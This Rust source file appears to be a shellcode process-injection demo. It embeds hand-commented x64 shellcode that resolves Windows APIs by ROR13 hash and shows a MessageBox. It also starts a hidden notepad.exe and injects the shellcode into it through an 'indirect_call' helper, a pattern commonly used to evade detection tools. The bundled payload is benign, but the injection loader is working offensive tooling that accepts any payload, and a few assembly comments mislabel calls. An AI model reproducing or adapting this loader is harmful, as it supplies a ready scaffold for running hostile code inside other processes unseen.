use std::mem::zeroed;
use windows::core::PSTR;
use windows::Win32::System::Threading::{CreateProcessA, CREATE_NO_WINDOW, PROCESS_INFORMATION, STARTUPINFOEXA};

mod indirect_calls;
use indirect_calls::indirect_call;
mod utils;
pub use utils::get_pid_by_name;

fn main() {
    // 弹出MessageBox
    // Title : DemonsEllen
    // Content : NewBee DemonsEllen
    let payload: [u8; 328] = [
        0xfc,                                           // cld
        0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff,       // and     rsp, 0FFFFFFFFFFFFFFF0h
        0xe8, 0xd0, 0x00, 0x00, 0x00,                   // call    Get_Rip
        0x41, 0x51,                                     // push    r9
        0x41, 0x50,                                     // push    r8
        0x52,                                           // push    rdx
        0x51,                                           // push    rcx
        0x56,                                           // push    rsi
        0x48, 0x31, 0xd2,                               // xor     rdx, rdx        ; rdx = 0
        0x65, 0x48, 0x8b, 0x52, 0x60,                   // mov     rdx, gs:[rdx+60h] ; rdx = PEB
        0x3e, 0x48, 0x8b, 0x52, 0x18,                   // mov     rdx, [rdx+18h] ; RDX = PEB->LDR
        0x3e, 0x48, 0x8b, 0x52, 0x20,                   // mov     rdx, [rdx+20h] ; rdx = InMemoryOrderModuleList
        0x3e, 0x48, 0x8b, 0x72, 0x50,                   // mov     rsi, [rdx+50h] ; rsi = DllBase（kernel32.dll 基址）
        0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,             // movzx   rcx, word ptr [rdx+4Ah] ; 获取模块名长度
        0x4d, 0x31, 0xc9,                               // xor     r9, r9
        0x48, 0x31, 0xc0,                               // xor     rax, rax  ;hash_loop:
        0xac,                                           // lodsb
        0x3c, 0x61,                                     // cmp     al, 61h ; 'a'
        0x7c, 0x02,                                     // jl      short no_lower  ; ROR13
        0x2c, 0x20,                                     // sub     al, 20h ; ' '   ; 变成大写
        0x41, 0xc1, 0xc9, 0x0d,                         // ror     r9d, 13         ; ROR13  no_lower:
        0x41, 0x01, 0xc1,                               // add     r9d, eax
        0xe2, 0xed,                                     // loop    hash_loop
        0x52,                                           // push    rdx
        0x41, 0x51,                                     // push    r9
        0x3e, 0x48, 0x8b, 0x52, 0x20,                   // mov     rdx, [rdx+20h]
        0x3e, 0x8b, 0x42, 0x3c,                         // mov     eax, [rdx+3Ch]
        0x48, 0x01, 0xd0,                               // add     rax, rdx
        0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00,       // mov     eax, [rax+88h]
        0x48, 0x85, 0xc0,                               // test    rax, rax
        0x74, 0x6f,                                     // jz      short loc_D1
        0x48, 0x01, 0xd0,                               // add     rax, rdx
        0x50,                                           // push    rax
        0x3e, 0x8b, 0x48, 0x18,                         // mov     ecx, [rax+18h]
        0x3e, 0x44, 0x8b, 0x40, 0x20,                   // mov     r8d, [rax+20h]
        0x49, 0x01, 0xd0,                               // add     r8, rdx
        0xe3, 0x5c,                                     // jrcxz   loc_D0
        0x48, 0xff, 0xc9,                               // dec     rcx
        0x3e, 0x41, 0x8b, 0x34, 0x88,                   // mov     esi, [r8+rcx*4]
        0x48, 0x01, 0xd6,                               // add     rsi, rdx
        0x4d, 0x31, 0xc9,                               // xor     r9, r9
        0x48, 0x31, 0xc0,                               // xor     rax, rax
        0xac,                                           // lodsb
        0x41, 0xc1, 0xc9, 0x0d,                         // ror     r9d, 0Dh
        0x41, 0x01, 0xc1,                               // add     r9d, eax
        0x38, 0xe0,                                     // cmp     al, ah
        0x75, 0xf1,                                     // jnz     short loc_82
        0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08,             // add     r9, [rsp+8]
        0x45, 0x39, 0xd1,                               // cmp     r9d, r10d
        0x75, 0xd6,                                     // jnz     short loc_72
        0x58,                                           // pop     rax
        0x3e, 0x44, 0x8b, 0x40, 0x24,                   // mov     r8d, [rax+24h]
        0x49, 0x01, 0xd0,                               // add     r8, rdx
        0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48,             // mov     cx, [r8+rcx*2]
        0x3e, 0x44, 0x8b, 0x40, 0x1c,                   // mov     r8d, [rax+1Ch]
        0x49, 0x01, 0xd0,                               // add     r8, rdx
        0x3e, 0x41, 0x8b, 0x04, 0x88,                   // mov     eax, [r8+rcx*4]
        0x48, 0x01, 0xd0,                               // add     rax, rdx
        0x41, 0x58,                                     // pop     r8
        0x41, 0x58,                                     // pop     r8
        0x5e,                                           // pop     rsi
        0x59,                                           // pop     rcx
        0x5a,                                           // pop     rdx
        0x41, 0x58,                                     // pop     r8
        0x41, 0x59,                                     // pop     r9
        0x41, 0x5a,                                     // pop     r10
        0x48, 0x83, 0xec, 0x20,                         // sub     rsp, 20h
        0x41, 0x52,                                     // push    r10
        0xff, 0xe0,                                     // jmp     rax
        0x58,                                           // pop     rax
        0x41, 0x59,                                     // pop     r9
        0x5a,                                           // pop     rdx
        0x3e, 0x48, 0x8b, 0x12,                         // mov     rdx, [rdx]
        0xe9, 0x49, 0xff, 0xff, 0xff,                   // jmp     loc_26          ; rsi = DllBase（kernel32.dll 基址）
        0x5d,                                           // pop     rbp ; Get_Rip:
        0x3e, 0x48, 0x8d, 0x8d, 0x30, 0x01, 0x00, 0x00, // lea     rcx, [rbp+130h]
        0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,             // mov     r10d, 726774Ch  ; LoadLibraryA的 ROR13 Hash
        0xff, 0xd5,                                     // call    rbp             ; Call GetProcAddres
        0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,       // mov     r9, 0           ; MB_OK = 0
        0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, // lea     rdx, [rbp+10Eh]
        0x3e, 0x4c, 0x8d, 0x85, 0x24, 0x01, 0x00, 0x00, // lea     r8, [rbp+124h]
        0x48, 0x31, 0xc9,                               // xor     rcx, rcx
        0x41, 0xba, 0x45, 0x83, 0x56, 0x07,             // mov     r10d, 7568345h  ; MessageBoxA
        0xff, 0xd5,                                     // call    rbp
        0x48, 0x31, 0xc9,
        0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56,
        0xff, 0xd5,
        // Content (22 bytes including padding for alignment)
        0x4e, 0x65, 0x77, 0x42, 0x65, 0x65, 0x20, 0x44, 0x65, 0x6d, 0x6f, 0x6e, 0x73, 0x45, 0x6c,
        0x6c, 0x65, 0x6e, 0x00, 0x00, 0x00, 0x00,
        // Title (11 bytes + null terminator = 12 bytes)
        0x44, 0x65, 0x6d, 0x6f, 0x6e, 0x73, 0x45, 0x6c, 0x6c, 0x65, 0x6e, 0x00,
        // DLL (user32.dll)
        0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00,
    ];

    unsafe{
        // 启动一个notepad作为注入进程
        let mut startup_info: STARTUPINFOEXA = zeroed();
        let mut process_info: PROCESS_INFORMATION = zeroed();
        startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
        let windir = std::env::var("WINDIR").unwrap() + "\\System32\\notepad.exe";
        // change

        let _ = CreateProcessA(
            None,
            Some(PSTR(windir.as_ptr() as _)),
            None,
            None,
            false,
            CREATE_NO_WINDOW,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        );
        
        let pid = get_pid_by_name("notepad.exe");

        indirect_call(&payload, pid);
    }
}
